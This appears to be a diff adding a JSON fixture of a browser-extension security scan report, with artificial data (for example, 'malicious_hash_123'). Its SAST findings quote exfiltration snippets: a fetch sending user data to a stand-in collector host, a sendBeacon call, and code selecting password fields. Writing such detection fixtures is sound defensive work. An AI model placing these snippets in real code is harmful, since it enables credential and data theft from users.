@@ -1,0 +1,117 @@
+{
+  "extension_id": "risky_extension_xyz789",
+  "manifest": {
+    "name": "Risky Extension",
+    "version": "1.0.0",
+    "manifest_version": 3,
+    "permissions": ["storage", "webRequest", "debugger"],
+    "host_permissions": ["<all_urls>"]
+  },
+  "extracted_files": [
+    "manifest.json",
+    "background.js",
+    "inject.js",
+    "packed.min.js"
+  ],
+  "permissions_analysis": {
+    "permissions_details": {
+      "webRequest": {
+        "is_reasonable": false,
+        "justification_reasoning": "No clear business need for intercepting all network traffic"
+      },
+      "debugger": {
+        "is_reasonable": false,
+        "justification_reasoning": "Debugger API allows arbitrary code execution - high risk"
+      }
+    }
+  },
+  "sast_results": {
+    "sast_analysis": "[RISK: HIGH] Found data exfiltration patterns",
+    "risk_level": "high",
+    "sast_findings": {
+      "background.js": [
+        {
+          "type": "data-exfil",
+          "severity": "high",
+          "description": "Potential data exfiltration to external endpoint",
+          "line_number": 87,
+          "snippet": "fetch('https://collector.suspicious.com/harvest?data=' + userData)"
+        },
+        {
+          "type": "fetch-external",
+          "severity": "high",
+          "description": "Unencrypted data transfer to unknown endpoint",
+          "line_number": 92,
+          "snippet": "sendBeacon('https://tracker.example.com', payload)"
+        }
+      ],
+      "inject.js": [
+        {
+          "type": "credential-access",
+          "severity": "critical",
+          "description": "Accessing password input fields",
+          "line_number": 23,
+          "snippet": "document.querySelectorAll('input[type=password]')"
+        }
+      ]
+    }
+  },
+  "virustotal_analysis": {
+    "total_malicious": 5,
+    "summary": {
+      "threat_level": "malicious"
+    },
+    "file_results": [
+      {
+        "file_name": "packed.min.js",
+        "file_path": "packed.min.js",
+        "virustotal": {
+          "found": true,
+          "sha256": "malicious_hash_123",
+          "detection_stats": {
+            "malicious": 5,
+            "suspicious": 3,
+            "harmless": 55,
+            "total": 70
+          },
+          "malware_families": ["Trojan.GenericKD", "Adware.BrowserModifier"]
+        }
+      }
+    ]
+  },
+  "entropy_analysis": {
+    "summary": {
+      "overall_risk": "high",
+      "obfuscation_detected": true
+    },
+    "file_results": [
+      {
+        "file_name": "packed.min.js",
+        "file_path": "packed.min.js",
+        "entropy": {
+          "byte_entropy": 7.8,
+          "char_entropy": 7.5,
+          "risk_level": "high"
+        },
+        "is_likely_obfuscated": true,
+        "obfuscation_patterns": [
+          {"pattern_name": "hex_encoding"},
+          {"pattern_name": "string_concatenation"},
+          {"pattern_name": "eval_usage"}
+        ]
+      }
+    ]
+  },
+  "webstore_analysis": {
+    "webstore_analysis": "Extension has suspicious behavior patterns. Risk: High."
+  },
+  "summary": {
+    "overall_risk_level": "high",
+    "overall_security_score": 25
+  },
+  "metadata": null
+}
+
+
+
+
